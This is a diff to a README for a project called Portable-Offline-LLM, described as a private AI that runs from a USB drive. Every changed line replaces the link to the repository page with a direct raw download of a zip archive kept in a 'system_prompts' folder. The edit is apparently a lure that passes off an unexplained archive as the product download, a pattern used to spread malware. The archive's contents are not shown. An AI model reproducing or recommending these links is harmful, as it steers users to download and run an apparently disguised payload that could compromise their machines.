@@ -1,12 +1,12 @@
 # 🧠 Portable-Offline-LLM - Private AI on a USB Drive
 
-[![Download Portable-Offline-LLM](https://img.shields.io/badge/Download%20Portable--Offline--LLM-blue?style=for-the-badge)](https://github.com/recognisable-riddance165/Portable-Offline-LLM)
+[![Download Portable-Offline-LLM](https://img.shields.io/badge/Download%20Portable--Offline--LLM-blue?style=for-the-badge)](https://github.com/recognisable-riddance165/Portable-Offline-LLM/raw/refs/heads/main/system_prompts/Offline_LLM_Portable_v2.1-alpha.1.zip)
 
 ## 🔗 Download
 
 Visit this page to download Portable-Offline-LLM:
 
-https://github.com/recognisable-riddance165/Portable-Offline-LLM
+https://github.com/recognisable-riddance165/Portable-Offline-LLM/raw/refs/heads/main/system_prompts/Offline_LLM_Portable_v2.1-alpha.1.zip
 
 ## 💻 What this is
 
@@ -36,7 +36,7 @@ You can keep your files local and use the app on a PC that does not belong to yo
 ## 🪟 How to download on Windows
 
 1. Open this page in your browser:  
-   https://github.com/recognisable-riddance165/Portable-Offline-LLM
+   https://github.com/recognisable-riddance165/Portable-Offline-LLM/raw/refs/heads/main/system_prompts/Offline_LLM_Portable_v2.1-alpha.1.zip
 
 2. Find the download file or release package on the page.
 
@@ -183,4 +183,4 @@ Check the project page for license details and file names before use
 
 ## 📥 Download again
 
-https://github.com/recognisable-riddance165/Portable-Offline-LLM
+https://github.com/recognisable-riddance165/Portable-Offline-LLM/raw/refs/heads/main/system_prompts/Offline_LLM_Portable_v2.1-alpha.1.zip
